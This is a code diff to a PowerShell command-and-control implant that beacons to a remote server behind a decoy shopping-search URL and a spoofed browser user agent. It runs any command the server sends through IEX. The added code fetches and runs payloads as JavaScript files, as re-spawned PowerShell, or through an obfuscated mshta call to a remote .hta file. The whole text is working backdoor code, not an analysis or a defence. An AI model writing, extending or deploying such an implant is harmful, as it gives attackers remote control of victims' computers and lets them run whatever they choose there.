@@ -3,43 +3,81 @@ $me = "2.4"
 $p0rt= "8080"
 $uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
 $proto = "ht"+"tp"+":/"+"/"
-$h0me = $proto+$h0+$me+":"+$p0rt+$uri
+$url = $proto+$h0+$me+":"+$p0rt
+$h0me = $url+$uri
 
 $type = "ps1"
 $id = Get-Random
 $un = $env:username
 $sleepytime = 3000
-
-$curcmnd = '{"cmnd": ""}'
 $jsObject = @{}
 
 $useragent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
 $checkin = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`"}"
 
+function ConvertTo-Hashtable {
+  [CmdletBinding()]
+  [OutputType('hashtable')]
+  param (
+    [Parameter(ValueFromPipeline)]
+     $InputObject
+  )
+
+  process {
+    if ($null -eq $InputObject) {
+      return $null
+    }
+    if ($InputObject -is [System.Collections.IEnumerable] -and $InputObject -isnot [string]) {
+      $collection = @(
+        foreach ($object in $InputObject) {
+          ConvertTo-Hashtable -InputObject $object
+        }
+      )
+
+      Write-Output -NoEnumerate $collection
+    }
+
+    elseif ($InputObject -is [psobject]) {
+      $hash = @{}
+      foreach ($property in $InputObject.PSObject.Properties) {
+        $hash[$property.Name] = ConvertTo-Hashtable -InputObject $property.Value
+      }
+      $hash
+    }
+    else {
+      $InputObject
+    }
+  }
+}
+
 while ($True) {
 	$serverMsg = (Invoke-WebRequest -Method Post -Uri $h0me -Body $checkin -UserAgent $useragent -UseBasicParsing).Content
 	$jsondata = "{" + $serverMsg.split("{")[1].split("`n")[0]
-	# Convert json string to PS hashtable by hand ... cancer
-	$jsondata.trim("{").trim("}").split(",") | foreach {
-		$key = $_.split(":")[0].trim(" ")
-		$key = $key.Substring(1, ($key.length)-2)
-		$value = $_.split(":")[1].trim(" ")
-		$value = $value.Substring(1, ($value.length)-2)
-		$value = $value.Replace('\"','"')
-		$jsObject[$key] = $value
-	}
-	if($jsObject['cmnd']) {
+  $jsObject = $jsondata | ConvertFrom-Json | ConvertTo-Hashtable
 
+	if($jsObject['cmnd']) {
 		if($jsObject['cmnd'] -eq "quit") {
 			exit
 		}
 
-		elseif($jsObject['cmnd'] -eq "spawn") {
+		elseif($jsObject['cmnd'].StartsWith("spawn")) {
 			try {
-				$req = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"req`": `"spawn`"}"
-				$selfdata = (Invoke-WebRequest -Method Post -Uri $h0me -Body $req -UserAgent $useragent -UseBasicParsing).Content
-				$selfdata = $selfdata.replace('"','"""')
-				Start-Process powershell -ArgumentList "-c $selfdata" -NoNewWindow
+        if($jsObject['cmnd'] -eq "spawn js") {
+				  $req = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"req`": `"spawn js`"}"
+				  $selfdata = (Invoke-WebRequest -Method Post -Uri $h0me -Body $req -UserAgent $useragent -UseBasicParsing).Content
+          $selfpath = "$env:temp\$id.js"
+          Set-Content -Path "$selfpath" -Value "$selfdata"
+				  Start-Process "$selfpath"
+        }
+        elseif($jsObject['cmnd'] -eq "spawn hta") {
+          Start-Process "xmxsxhxtxax".replace("x","") -ArgumentList "$url/r/b.hta"
+        }
+        else {
+				  $req = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"req`": `"spawn ps1`"}"
+				  $selfdata = (Invoke-WebRequest -Method Post -Uri $h0me -Body $req -UserAgent $useragent -UseBasicParsing).Content
+				  $selfdata = $selfdata.replace('"','"""')
+				  Start-Process powershell -ArgumentList "-c $selfdata" -NoNewWindow
+        }
 				$retval = "[+] Spawn success..."
 			}
 			catch {
@@ -48,7 +86,7 @@ while ($True) {
 		}
 
 		else {
-			$retval = IEX $jsObject.cmnd -ErrorVariable err 2>&1
+			$retval = IEX $jsObject['cmnd'] -ErrorVariable err 2>&1
 			if($err) {
 				$retval = $retval + "`n[-] Errors returned:`n`n" + $err
 				$err = ""
